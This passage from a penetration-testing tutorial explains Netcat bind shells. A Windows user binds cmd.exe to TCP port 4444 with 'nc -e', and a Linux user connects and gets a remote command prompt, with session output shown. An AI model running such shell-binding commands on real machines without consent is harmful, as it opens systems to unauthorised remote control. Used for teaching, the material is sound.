In our first scenario, Bob (running Windows) has requested Alice’s assistance (who is running Linux) and has asked her to connect to his computer and issue some commands remotely. Bob has a public IP address and is directly connected to the Internet. Alice, however, is behind a NATed connection, and has an internal IP address. To complete the scenario, Bob needs to bind cmd.exe to a TCP port on his public IP address and asks Alice to connect to his particular IP address and port.

Bob will check his local IP address, then run Netcat with the -e option to execute cmd.exe once a connection is made to the listening port:

	C:\Users\offsec> ipconfig 
	
	Windows IP Configuration Ethernet adapter Local Area Connection: Connection-specific DNS Suffix . : IPv4 Address. . . . . . . . . . . : 10.11.0.22 Subnet Mask . . . . . . . . . . . : 255.255.0.0 Default Gateway . . . . . . . . . : 10.11.0.1 
	
	
	C:\Users\offsec> nc -nlvp 4444 -e cmd.exe listening on [any] 4444 ...


Now Netcat has bound TCP port 4444 to cmd.exe and will redirect any input, output, or error messages from cmd.exe to the network. In other words, anyone connecting to TCP port 4444 on Bob’s machine (hopefully Alice) will be presented with Bob’s command prompt. This is indeed a “gaping security hole”!

	kali@kali:~$ ip address show eth0 | grep inet inet 10.11.0.4/16 brd 10.11.255.255 scope global dynamic eth0

	kali@kali:~$ nc -nv 10.11.0.22 4444

	Microsoft Windows [Version 10.0.17134.590] (c) 2018 Microsoft Corporation. All rights reserved.

	C:\Users\offsec> ipconfig Windows IP Configuration Ethernet adapter Local Area Connection: Connection-specific DNS Suffix . : IPv4 Address. . . . . . . . . . . : 10.11.0.22 Subnet Mask . . . . . . . . . . . : 255.255.0.0 Default Gateway . . . . . . . . . : 10.11.0.1

As we can see, this works just as expected. 

